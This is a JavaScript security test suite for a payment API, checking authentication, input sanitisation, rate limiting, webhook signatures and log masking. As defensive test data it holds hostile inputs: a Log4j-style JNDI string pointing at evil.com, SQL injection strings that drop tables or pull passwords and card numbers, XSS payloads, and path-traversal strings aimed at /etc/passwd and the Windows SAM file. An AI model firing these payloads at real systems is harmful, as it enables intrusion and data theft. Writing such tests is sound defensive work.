/**
 * Security Tests for Payment System
 * Tests security measures, vulnerabilities, and data protection
 */

const request = require('supertest');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const app = require('../../src/app');
const {
  setupTestDatabase,
  teardownTestDatabase,
  createTestUser,
  generateTestToken,
} = require('../utils/test-setup');

describe('Payment System Security Tests', () => {
  let server;
  let testUser;
  let authToken;

  beforeAll(async () => {
    await setupTestDatabase();
    server = app.listen(0);
  });

  afterAll(async () => {
    await teardownTestDatabase();
    if (server) {
      server.close();
    }
  });

  beforeEach(() => {
    testUser = createTestUser();
    authToken = generateTestToken({ userId: testUser._id });
  });

  describe('Authentication & Authorization', () => {
    it('should reject requests without authentication', async () => {
      const response = await request(app)
        .post('/api/payments/create-intent')
        .send({
          amount: 5000,
          currency: 'usd',
        });

      expect(response.status).toBe(401);
      expect(response.body.error.message).toContain('authentication');
    });

    it('should reject requests with invalid JWT tokens', async () => {
      const response = await request(app)
        .post('/api/payments/create-intent')
        .set('Authorization', 'Bearer invalid.jwt.token')
        .send({
          amount: 5000,
          currency: 'usd',
        });

      expect(response.status).toBe(401);
      expect(response.body.error.message).toContain('invalid token');
    });

    it('should reject expired JWT tokens', async () => {
      const expiredToken = jwt.sign(
        {
          userId: testUser._id,
          exp: Math.floor(Date.now() / 1000) - 3600, // Expired 1 hour ago
        },
        process.env.JWT_SECRET || 'test-secret'
      );

      const response = await request(app)
        .post('/api/payments/create-intent')
        .set('Authorization', `Bearer ${expiredToken}`)
        .send({
          amount: 5000,
          currency: 'usd',
        });

      expect(response.status).toBe(401);
      expect(response.body.error.message).toContain('expired');
    });

    it('should prevent access to other users payment data', async () => {
      const otherUser = createTestUser({ _id: 'other_user_id' });
      const otherUserToken = generateTestToken({ userId: otherUser._id });

      // Create payment with first user
      await request(app)
        .post('/api/payments/create-intent')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          amount: 5000,
          currency: 'usd',
          metadata: { orderId: 'private_order_123' },
        });

      // Try to access with second user
      const response = await request(app)
        .get('/api/payments/history')
        .set('Authorization', `Bearer ${otherUserToken}`);

      expect(response.status).toBe(200);
      
      // Should not see first user's payments
      const payments = response.body.payments || [];
      const hasPrivateOrder = payments.some(p => 
        p.metadata?.orderId === 'private_order_123'
      );
      expect(hasPrivateOrder).toBe(false);
    });

    it('should validate user permissions for admin endpoints', async () => {
      const regularUserToken = generateTestToken({ 
        userId: testUser._id,
        role: 'user' 
      });

      const response = await request(app)
        .get('/api/admin/payments/all')
        .set('Authorization', `Bearer ${regularUserToken}`);

      expect(response.status).toBe(403);
      expect(response.body.error.message).toContain('permission');
    });
  });

  describe('Input Validation & Sanitization', () => {
    it('should validate payment amounts', async () => {
      const invalidAmounts = [
        { amount: -100, description: 'negative amount' },
        { amount: 0, description: 'zero amount' },
        { amount: '5000', description: 'string amount' },
        { amount: 5000.5, description: 'decimal amount' },
        { amount: Number.MAX_SAFE_INTEGER, description: 'extremely large amount' },
      ];

      for (const test of invalidAmounts) {
        const response = await request(app)
          .post('/api/payments/create-intent')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            amount: test.amount,
            currency: 'usd',
          });

        expect(response.status).toBe(400);
        expect(response.body.error.message).toContain('amount');
      }
    });

    it('should validate and sanitize currency codes', async () => {
      const invalidCurrencies = [
        'invalid',
        'USD123',
        '<script>alert("xss")</script>',
        'usd', // lowercase
        null,
        undefined,
        '',
      ];

      for (const currency of invalidCurrencies) {
        const response = await request(app)
          .post('/api/payments/create-intent')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            amount: 5000,
            currency,
          });

        expect(response.status).toBe(400);
        expect(response.body.error.message).toContain('currency');
      }
    });

    it('should sanitize metadata inputs', async () => {
      const maliciousMetadata = {
        orderId: '<script>alert("xss")</script>',
        description: 'Normal description',
        customField: '${jndi:ldap://evil.com/exploit}', // Log4j style injection
        sqlInjection: "'; DROP TABLE payments; --",
      };

      const response = await request(app)
        .post('/api/payments/create-intent')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          amount: 5000,
          currency: 'USD',
          metadata: maliciousMetadata,
        });

      expect(response.status).toBe(200);
      
      // Verify metadata was sanitized
      const sanitizedMetadata = response.body.paymentIntent.metadata;
      expect(sanitizedMetadata.orderId).not.toContain('<script>');
      expect(sanitizedMetadata.customField).not.toContain('${jndi:');
      expect(sanitizedMetadata.sqlInjection).not.toContain('DROP TABLE');
    });

    it('should validate email addresses for Paystack', async () => {
      const invalidEmails = [
        'not-an-email',
        'test@',
        '@example.com',
        'test..test@example.com',
        '<script>alert("xss")</script>@example.com',
        null,
        undefined,
      ];

      for (const email of invalidEmails) {
        const response = await request(app)
          .post('/api/payments/paystack/initialize')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            amount: 50000,
            currency: 'NGN',
            email,
          });

        expect(response.status).toBe(400);
        expect(response.body.error.message).toContain('email');
      }
    });

    it('should prevent path traversal attacks', async () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
        '....//....//....//etc/passwd',
      ];

      for (const path of maliciousPaths) {
        const response = await request(app)
          .get(`/api/payments/receipt/${path}`)
          .set('Authorization', `Bearer ${authToken}`);

        expect(response.status).toBe(400);
        expect(response.body.error.message).toContain('Invalid');
      }
    });
  });

  describe('SQL Injection Protection', () => {
    it('should prevent SQL injection in payment queries', async () => {
      const sqlInjectionAttempts = [
        "' OR '1'='1",
        "'; DROP TABLE payments; --",
        "' UNION SELECT * FROM users --",
        "1' OR '1'='1' -- ",
        "admin'--",
        "admin'/*",
        "' OR 1=1#",
      ];

      for (const injection of sqlInjectionAttempts) {
        const response = await request(app)
          .get('/api/payments/history')
          .set('Authorization', `Bearer ${authToken}`)
          .query({
            orderId: injection,
            limit: 10,
          });

        // Should not crash and should not return unauthorized data
        expect(response.status).toBeLessThan(500);
        if (response.status === 200) {
          expect(response.body.payments).toBeDefined();
          expect(Array.isArray(response.body.payments)).toBe(true);
        }
      }
    });

    it('should use parameterized queries for database operations', async () => {
      // This test verifies that even with malicious input, the database operations are safe
      const response = await request(app)
        .post('/api/payments/search')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          query: "'; SELECT password FROM users WHERE email='admin@example.com'--",
          filters: {
            status: "' OR '1'='1",
            dateRange: "' UNION SELECT credit_card_number FROM payments--",
          },
        });

      // Should return proper results or validation error, not database error
      expect(response.status).not.toBe(500);
      if (response.body.error) {
        expect(response.body.error.message).toContain('validation');
      }
    });
  });

  describe('XSS Protection', () => {
    it('should sanitize output to prevent XSS', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        'javascript:alert("xss")',
        '<svg onload=alert("xss")>',
        '"><script>alert("xss")</script>',
        "'><script>alert('xss')</script>",
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/payments/create-intent')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            amount: 5000,
            currency: 'USD',
            description: payload,
          });

        if (response.status === 200) {
          const description = response.body.paymentIntent.description;
          expect(description).not.toContain('<script>');
          expect(description).not.toContain('javascript:');
          expect(description).not.toContain('onerror=');
          expect(description).not.toContain('onload=');
        }
      }
    });

    it('should set proper security headers', async () => {
      const response = await request(app)
        .get('/api/payments/history')
        .set('Authorization', `Bearer ${authToken}`);

      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
      expect(response.headers['content-security-policy']).toBeDefined();
    });
  });

  describe('Data Exposure Prevention', () => {
    it('should not expose sensitive data in responses', async () => {
      const response = await request(app)
        .post('/api/payments/create-intent')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          amount: 5000,
          currency: 'USD',
          paymentMethodId: 'pm_test_card',
        });

      expect(response.status).toBe(200);

      // Verify sensitive data is not exposed
      const responseBody = JSON.stringify(response.body);
      expect(responseBody).not.toContain('sk_'); // Stripe secret keys
      expect(responseBody).not.toContain('password');
      expect(responseBody).not.toContain('secret');
      expect(responseBody).not.toContain('private_key');
      expect(responseBody).not.toContain(process.env.JWT_SECRET || 'test-secret');
    });

    it('should not leak internal system information in error messages', async () => {
      // Force a database error
      const response = await request(app)
        .post('/api/payments/create-intent')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          amount: 5000,
          currency: 'USD',
          // Simulate invalid data that might cause internal error
          internalField: 'force_db_error_test',
        });

      if (response.status >= 500) {
        const errorMessage = response.body.error?.message || '';
        
        // Should not expose internal paths, database schema, etc.
        expect(errorMessage).not.toContain('/Users/');
        expect(errorMessage).not.toContain('C:\\');
        expect(errorMessage).not.toContain('database');
        expect(errorMessage).not.toContain('stack trace');
        expect(errorMessage).not.toContain('mongoose');
        expect(errorMessage).not.toContain('mongodb');
      }
    });

    it('should mask credit card numbers in logs', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation();
      
      await request(app)
        .post('/api/payments/create-intent')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          amount: 5000,
          currency: 'USD',
          cardNumber: '4242424242424242', // This should be masked
        });

      const logCalls = consoleSpy.mock.calls.flat().join(' ');
      
      // Should not log full credit card numbers
      expect(logCalls).not.toContain('4242424242424242');
      if (logCalls.includes('4242')) {
        expect(logCalls).toMatch(/\*{4}4242/); // Should be masked like ****4242
      }

      consoleSpy.mockRestore();
    });
  });

  describe('Rate Limiting & DoS Protection', () => {
    it('should rate limit payment creation requests', async () => {
      const requests = [];
      const rateLimitCount = 20; // Assuming rate limit is lower

      for (let i = 0; i < rateLimitCount; i++) {
        requests.push(
          request(app)
            .post('/api/payments/create-intent')
            .set('Authorization', `Bearer ${authToken}`)
            .send({
              amount: 5000,
              currency: 'USD',
            })
        );
      }

      const responses = await Promise.all(requests);
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
      
      const rateLimitResponse = rateLimitedResponses[0];
      expect(rateLimitResponse.headers['retry-after']).toBeDefined();
      expect(rateLimitResponse.body.error.message).toContain('rate limit');
    });

    it('should prevent large payload attacks', async () => {
      const largePayload = {
        amount: 5000,
        currency: 'USD',
        metadata: {},
      };

      // Create a very large metadata object (1MB+)
      largePayload.metadata.largeField = 'x'.repeat(1024 * 1024);

      const response = await request(app)
        .post('/api/payments/create-intent')
        .set('Authorization', `Bearer ${authToken}`)
        .send(largePayload);

      expect(response.status).toBe(413); // Payload too large
      expect(response.body.error.message).toContain('payload');
    });

    it('should limit concurrent connections per IP', async () => {
      const concurrentRequests = [];
      const connectionLimit = 50; // Assuming connection limit

      for (let i = 0; i < connectionLimit; i++) {
        concurrentRequests.push(
          new Promise(resolve => {
            setTimeout(() => {
              request(app)
                .get('/api/payments/history')
                .set('Authorization', `Bearer ${authToken}`)
                .end((err, res) => resolve(res));
            }, i * 10); // Stagger slightly
          })
        );
      }

      const responses = await Promise.all(concurrentRequests);
      const tooManyConnections = responses.filter(r => r.status === 503).length;
      
      // Some requests should be rejected due to connection limits
      expect(tooManyConnections).toBeGreaterThan(0);
    });
  });

  describe('Webhook Security', () => {
    it('should validate webhook signatures', async () => {
      const payload = JSON.stringify({
        id: 'evt_test_security',
        type: 'payment_intent.succeeded',
        data: { object: { id: 'pi_test' } },
      });

      // Test with invalid signature
      const response = await request(app)
        .post('/api/webhooks/stripe')
        .set('stripe-signature', 'invalid_signature')
        .send(payload);

      expect(response.status).toBe(400);
      expect(response.body.error.message).toContain('signature');
    });

    it('should prevent replay attacks on webhooks', async () => {
      const payload = JSON.stringify({
        id: 'evt_replay_test',
        type: 'payment_intent.succeeded',
        data: { object: { id: 'pi_replay_test' } },
      });

      const oldTimestamp = Math.floor(Date.now() / 1000) - 3600; // 1 hour ago
      const signature = crypto
        .createHmac('sha256', process.env.STRIPE_WEBHOOK_SECRET || 'test_secret')
        .update(`${oldTimestamp}.${payload}`, 'utf8')
        .digest('hex');

      const response = await request(app)
        .post('/api/webhooks/stripe')
        .set('stripe-signature', `t=${oldTimestamp},v1=${signature}`)
        .send(payload);

      expect(response.status).toBe(400);
      expect(response.body.error.message).toContain('timestamp');
    });

    it('should limit webhook payload size', async () => {
      const largePayload = JSON.stringify({
        id: 'evt_large_payload',
        type: 'payment_intent.succeeded',
        data: {
          object: {
            id: 'pi_test',
            largeData: 'x'.repeat(1024 * 1024), // 1MB
          },
        },
      });

      const timestamp = Math.floor(Date.now() / 1000);
      const signature = crypto
        .createHmac('sha256', process.env.STRIPE_WEBHOOK_SECRET || 'test_secret')
        .update(`${timestamp}.${largePayload}`, 'utf8')
        .digest('hex');

      const response = await request(app)
        .post('/api/webhooks/stripe')
        .set('stripe-signature', `t=${timestamp},v1=${signature}`)
        .send(largePayload);

      expect(response.status).toBe(413); // Payload too large
    });
  });

  describe('HTTPS and Transport Security', () => {
    it('should enforce HTTPS in production', async () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      const response = await request(app)
        .get('/api/payments/history')
        .set('Authorization', `Bearer ${authToken}`)
        .set('X-Forwarded-Proto', 'http'); // Simulate HTTP request

      expect(response.status).toBe(301); // Redirect to HTTPS
      expect(response.headers.location).toContain('https://');

      process.env.NODE_ENV = originalEnv;
    });

    it('should set secure cookie flags', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          email: testUser.email,
          password: 'correct_password',
        });

      if (response.headers['set-cookie']) {
        const cookies = response.headers['set-cookie'];
        const secureCookies = cookies.filter(cookie => 
          cookie.includes('Secure') && cookie.includes('HttpOnly')
        );
        expect(secureCookies.length).toBeGreaterThan(0);
      }
    });
  });

  describe('Encryption and Data Protection', () => {
    it('should encrypt sensitive data at rest', async () => {
      // Create a payment with sensitive metadata
      const sensitiveData = {
        customerNotes: 'Sensitive customer information',
        internalRef: 'INTERNAL-REF-123',
      };

      const response = await request(app)
        .post('/api/payments/create-intent')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          amount: 5000,
          currency: 'USD',
          metadata: sensitiveData,
        });

      expect(response.status).toBe(200);

      // Retrieve and verify data is accessible but stored encrypted
      const historyResponse = await request(app)
        .get('/api/payments/history')
        .set('Authorization', `Bearer ${authToken}`);

      const payment = historyResponse.body.payments?.find(p => 
        p.amount === 5000
      );

      expect(payment).toBeDefined();
      expect(payment.metadata.customerNotes).toBe(sensitiveData.customerNotes);
      expect(payment.metadata.internalRef).toBe(sensitiveData.internalRef);
    });

    it('should hash PII before storage', async () => {
      const response = await request(app)
        .post('/api/customers/create')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          email: testUser.email,
          phone: '+1234567890',
          address: {
            line1: '123 Test Street',
            city: 'Test City',
            postal_code: '12345',
          },
        });

      expect(response.status).toBe(200);

      // Verify PII is accessible through API but hashed in storage
      const customerResponse = await request(app)
        .get(`/api/customers/${response.body.customer.id}`)
        .set('Authorization', `Bearer ${authToken}`);

      expect(customerResponse.body.customer.email).toBe(testUser.email);
      expect(customerResponse.body.customer.phone).toBe('+1234567890');
    });
  });

  describe('Audit Logging', () => {
    it('should log security events', async () => {
      const consoleSpy = jest.spyOn(console, 'warn').mockImplementation();

      // Trigger a security event (invalid token)
      await request(app)
        .post('/api/payments/create-intent')
        .set('Authorization', 'Bearer invalid.token')
        .send({
          amount: 5000,
          currency: 'USD',
        });

      expect(consoleSpy).toHaveBeenCalledWith(
        expect.stringContaining('Invalid authentication attempt')
      );

      consoleSpy.mockRestore();
    });

    it('should log payment-related security events', async () => {
      const consoleSpy = jest.spyOn(console, 'warn').mockImplementation();

      // Attempt suspicious payment
      await request(app)
        .post('/api/payments/create-intent')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          amount: 999999999, // Suspiciously large amount
          currency: 'USD',
        });

      const logCalls = consoleSpy.mock.calls.flat().join(' ');
      expect(logCalls).toContain('Suspicious payment attempt');

      consoleSpy.mockRestore();
    });

    it('should not log sensitive information', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation();

      await request(app)
        .post('/api/payments/create-intent')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          amount: 5000,
          currency: 'USD',
          paymentMethodId: 'pm_test_card',
          cardNumber: '4242424242424242',
        });

      const logCalls = consoleSpy.mock.calls.flat().join(' ');
      
      // Should not log sensitive data
      expect(logCalls).not.toContain('4242424242424242');
      expect(logCalls).not.toContain('pm_test_card');
      expect(logCalls).not.toContain(authToken);

      consoleSpy.mockRestore();
    });
  });
});